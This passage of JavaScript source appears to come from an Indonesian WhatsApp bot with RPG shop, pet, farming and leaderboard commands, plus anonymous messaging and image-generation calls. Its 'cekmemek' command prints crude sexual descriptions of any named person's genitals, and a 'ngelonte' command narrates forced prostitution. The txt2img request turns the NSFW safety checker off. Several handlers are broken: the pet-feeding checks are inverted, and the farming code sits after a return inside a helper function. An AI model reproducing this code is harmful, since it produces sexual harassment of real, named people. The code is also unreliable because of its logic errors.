if (isCU < isi) return newReply(`Create Uncommon Mu Sisa ${getCU(m.sender)}`)
kurangCU(m.sender, isi)
let uangnye = Math.ceil(Math.random() * 99999)
let potionnye = Math.ceil(Math.random() * 20)
db.data.users[m.sender].money += uangnye
addPotion(m.sender, potionnye)
newReply(`
───── *Success* ─────
Kamu Mendapatkan :
💴 Balance: ${uangnye}
🍾 Potion: ${potionnye}
`)
} else if (args[0] === 'legendary') {
if (isi === '0') return newReply(`Masukan Jumlah Create`)
if (isi === 0) return newReply(`Masukan Jumlah Create Yang Mau Di Buka`)
if (isCL < isi) return newReply(`Create Legendary Mu Sisa ${getCL(m.sender)}`)
kurangCL(m.sender, isi)
let uangnye = Math.ceil(Math.random() * 99999)
let potionnye = Math.ceil(Math.random() * 50)
db.data.users[m.sender].money += uangnye
addPotion(m.sender, potionnye)
newReply(`
───── *Success* ─────
Kamu Mendapatkan :
💴 Balance: ${uangnye}
🍾 Potion: ${potionnye}`)
} else if (args.length === 0) return newReply(`
──── *Create Kamu* ────        
📦 Uncommon: ${getCU(m.sender)}
🌟 Mythic: ${getCM(m.sender)}
💫 Legendary: ${getCL(m.sender)}
*Penggunaan:* .open uncommon/mythic/legendary
*Contoh:* .open mythic 1`)
}
break
case 'pet': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
newReply(`──── *Pet Kamu 🐕* ────
Kucing : ${getKucing(m.sender)}
Anjing : ${getAnjing(m.sender)}
Naga: ${getNaga(m.sender)}
Kyubi: ${getKyubi(m.sender)}`)
}
break
case 'shop': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }

if (!args[0]) {
newReply(`──── *Shop* ────
📦 「 List Barang 」
> Potion | Harga $1000
> Kayu | Harga $1000
> Batu | Harga $1000
> Pasir | Harga $4000
> Semen | Harga $8000

🐕 「 Pet [ Hewan ] 」
> Kucing | Harga $3000
> Anjing | Harga $6000
> Kyubi | Harga $99999
> Naga | Harga $5000
> fpet < Makanan Hewan > | $1000

💫 「 Create 」    
> uncommon | Harga $5000
> mythic | Harga $3000
> legendary | Harga $2000

🍖 「 Makanan 」
> sop-sapi | Harga $2000
> ikan-goreng | Harga $3000
> steak | Harga $5000
> Sate | Harga $1000

🔑 「 Gacha 」
> key | Harga $2000

⚔️ 「 Perlengkapan 」
> Sword | Harga $5000
> Armor | Harga $3000

*Penggunaan:* .shop buy potion 5`)
} else if (args[0] === 'buy') {
if (args[1] === 'potion') {
let harga = 1000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addPotion(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Potion Sebesar ${args[2]} , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'kayu') {
let harga = 1000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addKayu(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Kayu Sebesar ${args[2]} , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'batu') {
let harga = 1000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addBatu(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Batu Sebesar ${args[2]} , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'kucing') {
if (isKucing > 1) return newReply(`Max Pet Kucing 1`)
let harga = 3000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
db.data.users[m.sender].kucing += args[2]
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Pet Kucing , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'anjing') {
if (isAnjing > 1) return newReply(`Max Pet Anjing 1`)
let harga = 6000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
db.data.users[m.sender].anjing += args[2]
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Pet anjing , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'uncommon') {
let harga = 5000 * args[2]
let input = args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addCU(m.sender, input)
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Create uncommon, Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'mythic') {
let harga = 3000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addCM(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Create Mythic, Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'legendary') {
let harga = 2000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addCL(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Create Legendary, Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'naga') {
if (isNaga > 1) return newReply(`Max Pet Naga 1`)
let harga = 5000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
db.data.users[m.sender].naga += args[2]
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Pet Naga , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'kyubi') {
if (isNaga > 1) return newReply(`Max Pet Kyubi 1`)
let harga = 99999 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
db.data.users[m.sender].kyubi += args[2]
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Pet Kyubi , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'fpet') {
let harga = 1000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
db.data.users[m.sender].feedpet += args[2]
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Makanan Pet , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'pasir') {
let harga = 4000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addPasir(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Pasir Sekarung , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'semen') {
let harga = 8000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addSemen(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Semen Sekarung , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'sate') {
let harga = 1000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addSate(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Sate , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'ikan-goreng') {
let harga = 3000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addGoreng(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Ikan Goreng , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'steak') {
let harga = 5000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addSteak(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Steak, Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'sop-sapi') {
let harga = 2000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addSop(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Sop Sapi , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'sword') {
let harga = 5000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addSword(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Sword Sebesar ${args[2]} , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'armor') {
let harga = 3000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addArmor(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Armor Sebesar ${args[2]} , Sisa Uang Mu ${getMonay(m.sender)}`)
} else if (args[1] === 'key') {
let harga = 2000 * args[2]
if (isMonay < harga) return newReply(`Uang Tidak Mencukupi`)
addKey(m.sender, args[2])
db.data.users[m.sender].money -= harga
newReply(`Berhasil Membeli Key Sebesar ${args[2]} , Sisa Uang Mu ${getMonay(m.sender)}`)
}
}
}
break
case 'gajian': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
function JaM(ms) {
  let h = isNaN(ms) ? '60' : Math.floor(ms / 3600000) % 60
  return [h].map(v => v.toString().padStart(2, 0) ).join(':')
}

function MeNit(ms) {
  let m = isNaN(ms) ? '60' : Math.floor(ms / 60000) % 60
  return [m].map(v => v.toString().padStart(2, 0) ).join(':')
}

function DeTik(ms) {
  let s = isNaN(ms) ? '60' : Math.floor(ms / 1000) % 60
  return [s].map(v => v.toString().padStart(2, 0) ).join(':')
}

let LastClaim = global.db.data.users[m.sender].lastclaim
let cdm = `${MeNit(new Date - LastClaim)}`
let cds = `${DeTik(new Date - LastClaim)}`
let cd1 = Math.ceil(44 - cdm)
let cd2 = Math.ceil(59 - cds)
  if (new Date - global.db.data.users[m.sender].lastclaim > 2700000) {
addMonay(m.sender, 7000)
    newReply('Nih Gaji Kamu +Rp7000')
    global.db.data.users[m.sender].lastclaim = new Date * 1
  } else return newReply(`Kamu Udah Ambil Jatah Hari Ini.\n\nTunggu ${cd1} Menit ${cd2} Detik!`)
  }
  break
case 'leaderboard': case 'lb': {
function toNumber(property, _default = 0) {

  if (property) return (a, i, b) => {

    return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }

  }

  else return a => a === undefined ? _default : a

}

function sort(property, ascending = true) {

  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]

  else return (...args) => args[ascending & 1] - args[!ascending & 1]

}

function enumGetKey(a) {

  return a.jid

}
if (!m.isGroup) return m.reply(mess.group)
let users = Object.entries(global.db.data.users).map(([key, value]) => {
    return { ...value, jid: key }
  })
  let sortedMoney = users.map(toNumber('money')).sort(sort('money'))
  let usersMoney = sortedMoney.map(enumGetKey)
  let len = args[0] && args[0].length > 0 ? Math.min(100, Math.max(parseInt(args[0]), 5)) : Math.min(5, sortedMoney.length)
  let textnua = `
┌「 *Money Leaderboard Top ${len}* 」
├ Kamu: *${usersMoney.indexOf(m.sender) + 1}* dari *${usersMoney.length}*
│
${sortedMoney.slice(0, len).map(({ jid, money }, i) => `├ ${i + 1}. ${participants.some(p => jid === p.jid) ? `(${conn.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]} *${money} Money*`).join`\n`}
╰────`.trim()
  conn.sendTextWithMentions(m.chat, textnua, m)
  }
break  
case 'feed': {
let user = db.data.users[m.sender]
let type = (args[0] || '').toLowerCase()
switch (type) {
case 'kucing':
if (user.kucing > 0) return reply(`Kamu Tidak Mempunyai Kucing.`)
if (user.kucing > 5) return reply(`Level Kucing Mu Sudah Max`)
if (user.feedpet > 0) return reply(`Kamu Tidak Memiliki Makanan Pet`)
if (user.kucing > 0) {
                        let naiklvl = ((user.kucing * 1000) - 1)
                        if (global.db.data.users[m.sender].kucingexp > naiklvl) {
                            global.db.data.users[m.sender].kucing += 1
                            global.db.data.users[m.sender].kucingexp -= (user.kucing * 1000)
                            reply(`Selamat Pet Kucing Kamu Naik level.!!`)
                            }
                            }
reply(`Kucing Kamu Sekarang Sudah Makan Dan Kenyang.!`)
break
case 'kyubi':
if (user.kyubi > 0) return reply(`Kamu Tidak Mempunyai Kyubi.`)
if (user.kyubi > 20) return reply(`Level Kyubi Mu Sudah Max`)
if (user.feedpet > 0) return reply(`Kamu Tidak Memiliki Makanan Pet`)
if (user.kyubi > 0) {
                        let naiklvl = ((user.kyubi * 1000) - 1)
                        if (global.db.data.users[m.sender].kyubiexp > naiklvl) {
                            global.db.data.users[m.sender].kyubi += 1
                            global.db.data.users[m.sender].kyubiexp -= (user.kyubi * 1000)
                            reply(`Selamat Pet kyubi Kamu Naik level.!!`)
                            }
                            }
reply(`Kyubi Kamu Sekarang Sudah Makan Dan Kenyang.!`)                 
break           
case 'naga':
if (user.naga > 0) return reply(`Kamu Tidak Mempunyai Naga.`)
if (user.naga > 5) return reply(`Level Naga Mu Sudah Max`)
if (user.feedpet > 0) return reply(`Kamu Tidak Memiliki Makanan Pet`)
if (user.naga > 0) {
                        let naiklvl = ((user.naga * 1000) - 1)
                        if (global.db.data.users[m.sender].nagaexp > naiklvl) {
                            global.db.data.users[m.sender].naga += 1
                            global.db.data.users[m.sender].nagaexp -= (user.kucing * 1000)
                            reply(`Selamat Pet Naga Kamu Naik level.!!`)
                            }
                            }
reply(`Naga Kamu Sekarang Sudah Makan Dan Kenyang.!`)
break                            
case 'anjing':
if (user.anjing > 0) return reply(`Kamu Tidak Mempunyai Anjing.`)
if (user.anjing > 5) return reply(`Level Anjing Mu Sudah Max`)
if (user.feedpet > 0) return reply(`Kamu Tidak Memiliki Makanan Pet`)
if (user.anjing > 0) {
                        let naiklvl = ((user.anjing * 1000) - 1)
                        if (global.db.data.users[m.sender].anjingexp > naiklvl) {
                            global.db.data.users[m.sender].anjing += 1
                            global.db.data.users[m.sender].anjingexp -= (user.anjing * 1000)
                            reply(`Selamat Pet Anjing Kamu Naik level.!!`)
                            }
                            }
reply(`Anjing Kamu Sekarang Sudah Makan Dan Kenyang.!`)           
break          
default:
reply(`Ex: ${command} <anjing/kucing/naga/kyubi>`)
}
}
break
case 'berkebon': case 'petani': {
function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    
  
  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " jam " + minutes + " menit " + seconds + " detik"
const timeout = 1800000
	                                 let apelu = global.db.data.users[m.sender].bibitapel
                                     let angguru = global.db.data.users[m.sender].bibitanggur
                                     let manggau = global.db.data.users[m.sender].bibitmangga
                                     let pisangu = global.db.data.users[m.sender].bibitpisang
                                     let jeruku = global.db.data.users[m.sender].bibitjeruk 
	                                 let time = global.db.data.users[m.sender].lastberkebon + 1800000
                                     if (apelu == 0 || angguru == 0 || manggau == 0 || pisangu == 0 || jeruku == 0) return reply(`*Pastikan kamu memiliki semua bibit*\n*Seperti Bibit Apel, Bibit Mangga, Bibit Jeruk, Bibit Pisang, Bibit Anggur*\n\nKetik :\n${usedPrefix}shop buy bibitmangga 500\n\n*List*\nbibitmangga\nbibitanggur\nbibitpisang\nbibitjeruk\nbibitapel`)
                                     if (new Date - global.db.data.users[m.sender].lastberkebon< 1800000) return reply(`Anda sudah menanam\nMohon tunggu hasil panenmu\nTunggu selama ${msToTime(time - new Date())} lagi`)
                                     if (global.db.data.users[m.sender].bibitmangga > 499) {
                                 	if (global.db.data.users[m.sender].bibitapel > 499) {
                                 	if (global.db.data.users[m.sender].bibitpisang > 499) {
                                 	if (global.db.data.users[m.sender].bibitjeruk > 499) {
                                 	if (global.db.data.users[m.sender].bibitanggur > 499) {
                                     let pisangpoin = `${Math.floor(Math.random() * 500)}`.trim()
                                     let anggurpoin = `${Math.floor(Math.random() * 500)}`.trim()
                                     let manggapoin = `${Math.floor(Math.random() * 500)}`.trim()
                                     let jerukpoin = `${Math.floor(Math.random() * 500)}`.trim()
                                     let apelpoin = `${Math.floor(Math.random() * 500)}`.trim()
                                     global.db.data.users[m.sender].pisang += pisangpoin * 1
                                     global.db.data.users[m.sender].anggur += anggurpoin * 1
                                     global.db.data.users[m.sender].mangga += manggapoin * 1
                                     global.db.data.users[m.sender].jeruk += jerukpoin * 1
                                     global.db.data.users[m.sender].apel += apelpoin * 1
                                     global.db.data.users[m.sender].bibitpisang -= 500
                                     global.db.data.users[m.sender].bibitanggur -= 500
                                     global.db.data.users[m.sender].bibitmangga -= 500
                                     global.db.data.users[m.sender].bibitjeruk -= 500
                                     global.db.data.users[m.sender].bibitapel -= 500
                                     global.db.data.users[m.sender].lastberkebon = new Date * 1
                                     let hsl = `Selamat ${pushname}, Kamu mendapatkan : \n+${pisangpoin} Pisang\n+${manggapoin} Mangga\n+${anggurpoin} Anggur\n+${jerukpoin} Jeruk\n+${apelpoin} Apel`
                                     reply(hsl)
                                     setTimeout(() => {
					                      reply(`Waktunya Ngebon Lagi Kak!!`)
					                  }, timeout)
                                  } else reply(`Pastikan bibit anggur kamu *500* untuk bisa berkebon`)
                              } else reply(`Pastikan bibit jeruk kamu *500* untuk bisa berkebon`)
                          } else reply(`Pastikan bibit pisang kamu *500* untuk bisa berkebon`)
                      } else reply(`Pastikan bibit apel kamu *500* untuk bisa berkebon`)
                  } else reply(`Pastikan bibit mangga kamu *500* untuk bisa berkebon`)
              }

}
break
case 'changelog':
    case 'log': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')    
      if (!changelogs.length) return reply('There are no changelogs yet')
      caption = changelogs.map(changelog => {
        let [date, ...items] = changelog.split(' - ')
        return `☀️ ${date}\n${items.map(item => `  📜 ${item}`).join('\n')}`
      }).join('\n\n')
conn.sendMessage(m.chat, {
    text: Styles(caption),
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false,
        title: `Changelog Ary Md:3`,
        body: `${global.wm}`,
        thumbnailUrl: "https://telegra.ph/file/8105d82b7a09255f87eca.jpg",
        sourceUrl: "https://chat.whatsapp.com/D154truBoj0C27OE3XBYXa",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
      break
      
    case 'addchangelog': case 'addlog': {
      if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
      if (!text) return reply(`Usage: ${prefix}addchangelog <text>`)
      changelogs.unshift(`${new Date().toDateString()} - ${text}`)
      global.db.data.changelog = changelogs
      reply('Changelog Berhasil Di Tambahkan 🔑')
      }
      break
      
    case 'rchangelog': case 'rlog': {
      if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
      if (!text) return reply(`Usage: ${prefix}rchangelog <text>`)
      let index = changelogs.findIndex(changelog => changelog.includes(text))
      if (index === -1) return reply('Changelog not found')
      changelogs.splice(index, 1)
      global.db.data.changelog = changelogs
      reply('Changelog Berhasil Dihapus 🔥')
      }
      break
case 'ayatkursi': {
reply(`
*「 Ayat Kursi 」*

اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ

“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”


Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)`)
}
break
case 'ngelonte': case 'pelacur': case 'ngelont': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')

function clockString(ms) {
  let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
  let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  return ['\n' + d, ' *Hari*\n ', h, ' *Jam*\n ', m, ' *Menit*\n ', s, ' *Detik* '].map(v => v.toString().padStart(2, 0)).join('')
}   
	let __timers = (new Date - global.db.data.users[m.sender].lastberbru)
	let _timers = (500000 - __timers)
	let timers = clockString(_timers)
	let user = global.db.data.users[m.sender]
	if (new Date - global.db.data.users[m.sender].lastlont > 500000) {
		let hsl = `Kamu Terbaring Lemas Karna Melakukan Skidipapap 24 Jam Tetapi Kamu Mendapatkan:
Uang: Rp.300000
Dan Gratis Boba + Nasi Padang
`
addMonay(m.sender, 300000)

		setTimeout(() => {
			reply(hsl)
		}, 20000)

		setTimeout(() => {
		    reply(`Kamu Di Paksa Untuk Melayaninya 24 Jam`)
		}, 18000)

		setTimeout(() => {
			reply(`Kamu Mulai Melakukan Skidipapap Dengannya`)
		}, 15000)

		setTimeout(() => {
			reply(`Kamu Mendapatkan Pelanggan Dan Pergi Ke Hotel`)
		}, 14000)

		setTimeout(() => {
			reply(`Sedang Mencari Pelanggan`)
		}, 0)
		user.lastlont = new Date * 1
	} else reply(`*Kamu Sudah Kecapekan*\n*Silahkan Istirahat Dulu Selama* ${timers}`)
}
break
case 'cekmemek': case 'memekcek': case 'cekmmk': case 'mmkcek': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return reply(`Yang Mau Di Cek Mmk Nya Namanya Siapa?`)
reply(`
╭━━━━°「 *Memek ${text}* 」°
┃
┊• Nama : ${text}
┃• memek : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• lubang : ${pickRandom(['perawan','ga perawan','udah pernah dimasukin','masih rapet','tembem'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
╰═┅═━––––––๑`)
}
break 

case 'unreg': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
const createHash = require("crypto");
let sn = crypto.createHash('md5').update(m.sender).digest('hex')
if (!q) return newReply(`Ns Tidak Valid`)
if (args[0] !== sn) return newReply(`Ns Yang Kamu Masukan Salah!!`)
delRegister(m.sender)

newReply(`🍄 Thank you, now you have successfully unregistered`)
}
break
case 'myns': case 'cekns': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
const createHash = require("crypto");
let sn = crypto.createHash('md5').update(m.sender).digest('hex');
newReply(`${sn}`)
}
break

case 'txt2img': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return newReply(`Masukan Query`)
const payloads = {
    server_name: "rose",
    prompt: `${text}`, // your imagination go here
    width: 512, // 512-1024
    height: 768, // 512-1024
    steps: 25, // max 50 steps
    model_id: "realistic_vision_v51", // default dream_shaper
    sampler: "DPM++ 2M SDE Karras", // default DPMS
    seed: null, // pass null or remove to get random seed
    cfg: 7.5, // max 15<
    image_num: 1, // max 4
    negative_prompt: "ugly, ugly eyes, ugly face, deformed eyes, multi body, deformed body, disfigured, deformed, poorly drawn, extra limbs, close up, weird, blurry, watermark, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts, signature, watermark, picture frame, deformed hands, deformed eyes, multi body, deformed body, disfigured, bad art, deformed, poorly drawn, extra limbs, close up, weird, blurry, watermark, blurry, watermark, low res, bad hands, text, error, missing fingers, extra digit, fewer digits, cropped, worst quality, low quality, normal quality, jpeg artifacts, signature, watermark, picture frame, two heads, three heads, out of frame, disfigured, low-res, Deformed, blurry, bad anatomy, poorly drawn face, mutation, extra limb, ugly, poorly drawn hands, missing limb, blurry, floating limbs, disconnected limbs, malformed hands, blur, out of focus, long neck, long body, disgusting, poorly drawn", // something you dont want to appear in the image
    safety_checker: "no", // set "yes" to replace nsfw image

    /* Another optional parameter */
    enhance_prompt: "yes", // if "yes" will add another prompt
    multi_lingual: "no", // pass "yes" if you want to use other than the English language
    clip_skip: 2,
    panorama: "no", // pass "yes" if you want a panorama image
    lora_model: "kyn-nezuko,shirtlift", // use loaded lora_model
    hiresFix: "no", // otherwise pass "no"
    lora_strength: 0.5, // default 1
    embeddings_model: "",
    webhook: null, // will send post about generating progress
  };
  
    m.reply('_Preparing Stable diffusion..._')

  try {
    const { data } = await axios.request({
      baseURL: "https://api.itsrose.life",
      url: "/image/diffusion/txt2img",
      method: "POST",
      params: {
        apikey: `${global.rose}`,
      },
      data: payloads,
    }).catch((e) => e?.response)

    const { status, message, result } = data;

    if (!status) {
      // something wrong with your payloads
      m.reply(message); // see the message
    } else {
    const { images, metadata, generation_time } = result;
    let second = result.generation_time.toFixed()
    let model = metadata.model_id;
    let schedule = metadata.scheduler;
    let tip = result.tips
    let w = metadata.W;
    let h = metadata.H;
    let cfg = metadata.guidance_scale;
    let step = metadata.steps;
    let seed = metadata.seed;
    let streng = metadata.clip_skip
    
    
    let medata = `*Generating Time*: ${second} second
*prompt*: ${text}
*model_id*: ${model}
*scheduler*: ${schedule}
*W*: ${w}
*H*: ${h}
*guidance_scale*: ${cfg}
*steps*: ${step}
*seed*: ${seed}
*clip_skip*: ${streng}`;
    await m.reply(medata);
   
      for (const image of images) {
      await new Promise((resolve) => {
        setTimeout(async () => {
          await conn.sendMessage(m.chat, { image: { url: image } });
          resolve();
        }, generation_time * 1000);
      });
    }
    }
  } catch (error) {
    console.error(error);
    m.reply("An error occurred while processing the request.");
  }
}
break
case 'zr':
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!text) return m.reply(`Usage: ${prefix + command} hello`);
conn.sendMessage(m.chat, {
  react: {
    text: '🕛',
    key: m.key
  }
})
try {
  const response = await axios.get(`https://api.lolhuman.xyz/api/openai?apikey=${apilol}&text=${text}&user=user-unique-id`)
  const data = response.data;
  if (data.status === 200 && data.message === 'success') {
    const result = data.result;
    reply(result)
  } else {
    reply('Gagal mendapatkan data dari API.');
  }
} catch (error) {
  console.error(error);
  reply('Terjadi kesalahan dalam memproses permintaan.');
}
break
case 'menfess': case 'confess': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (m.isGroup) return newReply(`Khusus Di Private Chat!!`)
      global.db.menfess = global.db.menfess ? global.db.menfess : {}
      if (!text) return newReply(` ${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let [jid, name, msg] = text.split`|`
      if ((!jid || !name || !msg)) return newReply(`${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
      let p = (await conn.onWhatsApp(jid))[0] || {}
      if (!p.exists) return newReply('❌ Nomer Yang Kamu Masukan Salah')
      if (p.jid == m.sender) return newReply('Itu Nomer Lu Dodol!!')
      let mf = Object.values(global.db.menfess).find(mf => mf.status === true)
      if (mf) return !0
      try {
         let id = +new Date
         let txt = `⚡ Hai kamu menerima pesan Rahasia nih dari : *${name.trim()}*\nPesan: `
         txt += `${msg.trim()}\n*Untuk Membalas Kamu Cukup Mengetik Pesan Saja*`
         await conn.sendMessage(p.jid, { text: txt }).then(() => {
 newReply(`*Berhasil Mengirim Pesan Menfess!!*`)       
            global.db.menfess[id] = {
               id,
               from: m.sender,
               name,
               receiver: p.jid,
               msg,
               status: false
            }
            return !0
         })
      } catch (e) {
         console.log(e)
         newReply(`Gagal`)
      }
   }
   break
case 'bansos': case 'korupsi': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
let uangnye = Math.floor(Math.random() * (100000000 - 100000 + 1) + 100000)
let userbansosCooldown = Date.now() + 3600000
  let successImage = 'https://cdn.jsdelivr.net/gh/SazumiVicky/MakeMeow-Storage@main/korupsi.jpeg'
  let failureImage = 'https://cdn.jsdelivr.net/gh/SazumiVicky/MakeMeow-Storage@main/menolak_korupsi.jpg'
  let successMessage = `Congratulations you have invited your friends to corruption and you get *${uangnye}* Balance`
